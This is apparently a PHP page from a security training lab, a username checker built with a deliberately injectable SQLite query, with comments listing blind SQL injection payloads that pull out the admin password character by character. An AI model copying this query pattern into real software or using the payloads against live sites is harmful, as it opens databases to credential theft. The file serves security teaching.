<?php
require __DIR__ . '/../functions.php';






load_header("Registration");
?>


    <h2>Blind SQL Injection 2</h2>
    <h3>Abuse the website to find out the password of a user: admin</h3>    
      <hr class="divider">
  

    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Username Check</title>
    <style>
        .lab {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f3f3f3; /* Light gray background */
            color:black;
        }

        .header {
            background-color: #CC0000; /* Red */
            color: white;
            padding: 10px 20px;
            text-align: center;
        }

        .header h1 {
            margin: 0;
            font-size: 24px;
        }

        .container {
            margin: 20px auto;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 600px;
        }

        .lab h2 {
            color: #CC0000;
            font-size: 20px;
            margin-bottom: 20px;
        }

        form {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            background-color: #CC0000; /*  Red */
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #990000;
        }

        .message {
            padding: 10px;
            border-radius: 4px;
            font-size: 14px;
            color: white;
        }

        .error {
            background-color: #d9534f; /* Red for error */
        }

        .success {
            background-color: #5cb85c; /* Green for success */
        }
    </style>
<div class="lab">
    <div class="header">
        <h1>Username Availability Checker</h1>
    </div>
    <div class="container">
        <h2>Check Username Availability</h2>
        <p>Enter a username below to check if it's already taken:</p>
        <form method="GET" action="">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" placeholder="Enter username..." required>
            <button type="submit">Check</button>
        </form>

        <?php
        if (!empty($_GET['username'])) {
            $username = $_GET['username'];

            // Connect to the SQLite database
            $db = new SQLite3('users.db');

            // Vulnerable query (no prepared statements)
            $query = "SELECT username FROM users WHERE username = '$username'";
            $result = $db->query($query);

            if ($result && $row = $result->fetchArray()) {
                echo "<div class='message error'>The username is already taken.</div>";
            } else {
                echo "<div class='message success'>The username is available.</div>";
            }
        }
        ?>
    </div>
    </div>
    



<?php
    load_footer();

?>


<?php
#admin' AND '1'='1
#admin' AND '1'='2
#admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' --
#admin' AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='b' --

?>